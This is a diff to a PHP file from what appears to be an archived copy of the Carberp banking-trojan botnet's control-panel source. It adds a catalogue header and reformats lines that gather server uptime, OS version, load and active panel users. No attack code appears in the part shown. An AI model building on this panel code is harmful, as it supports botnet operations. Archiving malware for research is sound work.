@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 function time_check($key, $value){
@@ -52,9 +63,12 @@ function time_math($s){
 
 $brainforce["server_uptime"] = time_math(strtok( exec( "cat /proc/uptime" ), "." ));
 
-if(file_exists('/etc/redhat-release')){	$brainforce["os"] = file_get_contents('/etc/redhat-release');
-}elseif(file_exists('/etc/release')){	$brainforce["os"] = file_get_contents('/etc/release');
-}else{	$brainforce["os"] = php_uname('s') . ' ' . php_uname('r') . ' (' . php_uname('m') . ')';
+if(file_exists('/etc/redhat-release')){
+	$brainforce["os"] = file_get_contents('/etc/redhat-release');
+}elseif(file_exists('/etc/release')){
+	$brainforce["os"] = file_get_contents('/etc/release');
+}else{
+	$brainforce["os"] = php_uname('s') . ' ' . php_uname('r') . ' (' . php_uname('m') . ')';
 }
 
 $brainforce["webserver"] = $_SERVER["SERVER_SOFTWARE"];
@@ -120,7 +134,8 @@ if(function_exists('sys_getloadavg')){
 	$brainforce['sys_loadavg']['0'] *= 100;
 	$brainforce['sys_loadavg']['1'] *= 100;
 	$brainforce['sys_loadavg']['2'] *= 100;
-}else{	$brainforce['sys_loadavg']['0'] = '-';
+}else{
+	$brainforce['sys_loadavg']['0'] = '-';
 	$brainforce['sys_loadavg']['1'] = '-';
 	$brainforce['sys_loadavg']['2'] = '-';
 }
@@ -130,7 +145,8 @@ $brainforce['count_users'] = $mysqli->query_name("SELECT COUNT(id) count FROM bf
 
 $result = $mysqli->query("SELECT * FROM bf_users WHERE (PHPSESSID<>'') AND (expiry_date >= DATE_ADD(NOW(), INTERVAL -5 MINUTE)) ORDER by expiry_date DESC", null, null, false);
 if(count($result) > 0){
-	foreach($result as &$user){		$user->info = json_decode($user->info);
+	foreach($result as &$user){
+		$user->info = json_decode($user->info);
 	}
 }
 
